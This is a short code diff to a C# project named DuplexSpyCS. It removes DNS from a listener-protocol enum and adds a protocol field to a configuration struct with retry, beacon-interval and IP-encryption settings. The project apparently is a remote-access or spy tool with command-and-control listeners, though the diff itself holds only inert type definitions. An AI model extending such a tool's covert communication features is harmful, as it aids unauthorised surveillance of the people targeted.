@@ -116,7 +116,6 @@ namespace DuplexSpyCS
     {
         TCP,
         TLS,
-        DNS,
         HTTP,
     }
 
@@ -181,6 +180,7 @@ namespace DuplexSpyCS
         public int dwRetry; //Milisecond
         public int dwInterval; //Send inform interval, ms
         public string szPrefix;
+        public enListenerProtocol enProtocol;
 
         public bool bEncryptIP; //Encrypt IP
 
